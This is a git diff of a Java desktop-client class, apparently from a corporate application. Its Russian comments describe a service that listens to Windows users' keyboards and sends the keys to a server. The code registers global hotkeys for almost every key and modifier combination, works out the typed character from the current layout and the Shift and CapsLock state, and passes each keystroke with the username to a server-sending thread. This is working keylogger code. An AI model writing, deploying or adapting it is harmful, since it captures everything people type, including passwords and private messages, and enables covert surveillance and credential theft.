@@ -15,14 +15,23 @@ import ru.kolaer.client.javafx.tools.Resources;
 import ru.kolaer.client.javafx.tools.User32;
 import ru.kolaer.client.javafx.tools.User32.MSG;
 
+/**
+ * Служба для прошлушивания клавиатуры windows-пользователей и отправки клавиши на сервер.
+ *
+ * @author danilovey
+ * @version 0.1
+ */
 public class UserWindowsKeyListenerService implements LocaleService {
 	private final Logger LOG = LoggerFactory.getLogger(UserWindowsKeyListenerService.class);
-	
+	/**Объект для работы с сервером.*/
 	private final RestTemplate restTemplate = new RestTemplate();
+	/**Имя пользователя.*/
 	private final String username = System.getProperty("user.name");
+	/**Пул потоков.*/
 	private final ExecutorService keysThreadPool = Executors.newFixedThreadPool(25);
-	
+	/**Нажат ли CapsLock.*/
 	private boolean isCapsLock = false;
+	/**ID клавиши.*/
 	private int id;
 	
 	private boolean isRun = false;
@@ -53,13 +62,15 @@ public class UserWindowsKeyListenerService implements LocaleService {
 	public void run() {	
 		CompletableFuture.runAsync(() -> {
 			Thread.currentThread().setName("Регистрация клавиш");
+			//Регистрируем клавиши ( пропуская комбинации с ctrl, alt, win и т.д. с нестандарными клавишами)
 			for(int i = 8; i <= 222; i++){
 				User32.RegisterHotKey(null, i, 0, i);
+				
 				if(i>40) {
-					User32.RegisterHotKey(null, i + 1000, 0x0001, i);
-					User32.RegisterHotKey(null, i + 2000, 0x0002, i);
-					User32.RegisterHotKey(null, i + 3000, 0x0004, i);
-					User32.RegisterHotKey(null, i + 4000, 0x0008, i);
+					User32.RegisterHotKey(null, i + 1000, 0x0001, i); //Ctrl
+					User32.RegisterHotKey(null, i + 2000, 0x0002, i); //Alt
+					User32.RegisterHotKey(null, i + 3000, 0x0004, i); //Shift
+					User32.RegisterHotKey(null, i + 4000, 0x0008, i); //Win
 				}
 			}
 		}).thenRunAsync(() -> {
@@ -75,7 +86,9 @@ public class UserWindowsKeyListenerService implements LocaleService {
 			boolean alt = false;
 
 			while(this.isRun){
+				//Получаем системные сообщения
 				while(User32.GetMessage(msg, null, 0, 0, User32.PM_REMOVE)){
+					//Если остановка службы, то убираем все клавиши
 					if(!this.isRun) {
 						for(int i = 8; i <= 222; i++){
 							User32.UnregisterHotKey(null, i);
@@ -86,14 +99,15 @@ public class UserWindowsKeyListenerService implements LocaleService {
 								User32.UnregisterHotKey(null, i + 4000);
 							}
 						}
-						
+						this.keysThreadPool.shutdown();
 						break;
 					}
 					
+					//Если это клавиша
 					if(msg.message == User32.WM_HOTKEY){
-					
+						
 						this.id = msg.wParam.intValue();
-
+						//Получаем id клавиши без комбинации
 						if(this.id > 4000)
 							this.id -= 4000;
 						else if(this.id > 3000)
@@ -103,6 +117,7 @@ public class UserWindowsKeyListenerService implements LocaleService {
 						if(this.id > 1000)
 							this.id -= 1000;
 						
+						//Убрираем из прослушивания клавишу
 						User32.UnregisterHotKey(null, this.id);
 						User32.UnregisterHotKey(null, this.id + 1000);
 						User32.UnregisterHotKey(null, this.id + 2000);
@@ -110,15 +125,18 @@ public class UserWindowsKeyListenerService implements LocaleService {
 						User32.UnregisterHotKey(null, this.id + 4000);
 						
 						final int idTemp = this.id;
+						//Получаем язык раскладки
 						final boolean isRus = User32.GetKeyboardLayout(User32.GetWindowThreadProcessId(User32.GetForegroundWindow(), 0)) == 25 ? true : false;
+						//Статус Shift
 						final int shiftKey = User32.GetKeyState(16);
 						
+						//В потоке отправляем клавишу
 						CompletableFuture.runAsync(() -> {
 							Thread.currentThread().setName("Отправление клавиши на сервер!");
 							
 							if(idTemp == 20)
 								this.isCapsLock = !this.isCapsLock;
-
+							//Получаем символ клавиши в зависимости от языка
 							String key = isRus ? getRusKey(idTemp) : getEngKey(idTemp);
 						
 							if(shiftKey < 0){
@@ -173,13 +191,24 @@ public class UserWindowsKeyListenerService implements LocaleService {
 			}
 		}).exceptionally(t -> {
 			LOG.error("Ошибка!", t);
+			this.stop();
 			return null;
 		});		
 	}
-
+	
 	@Override
 	public void stop() {
 		this.isRun = false;
+		
+		for(int i = 8; i <= 222; i++){
+			User32.UnregisterHotKey(null, i);
+			if(i>40) {
+				User32.UnregisterHotKey(null, i + 1000);
+				User32.UnregisterHotKey(null, i + 2000);
+				User32.UnregisterHotKey(null, i + 3000);
+				User32.UnregisterHotKey(null, i + 4000);
+			}
+		}
 		
 		this.keysThreadPool.shutdown();
 		try {
@@ -190,7 +219,8 @@ public class UserWindowsKeyListenerService implements LocaleService {
 			this.keysThreadPool.shutdownNow();
 		}
 	}
-
+	
+	/**Получение символа + Shift клавиши по коду.*/
 	private String getShiftKey(int code, final String key, final boolean isRus) {		
 		if(65 <= code && code <= 90){
 			return this.isCapsLock ? key.toLowerCase() : key.toUpperCase();
@@ -221,6 +251,7 @@ public class UserWindowsKeyListenerService implements LocaleService {
 		}
 	}
 	
+	/**Получение символа клавиши с русской раскладкой.*/
 	private String getRusKey(int code) {
 		switch(code) {
 			case 65: return "ф";
@@ -260,7 +291,8 @@ public class UserWindowsKeyListenerService implements LocaleService {
 			default: return getEngKey(code);
 		}
 	}
-
+	
+	/**Получение символа клавиши с англ. раскладкой.*/
 	private String getEngKey(int code) {
 		switch(code) {
 			case 8: return "<BaskSpace>";
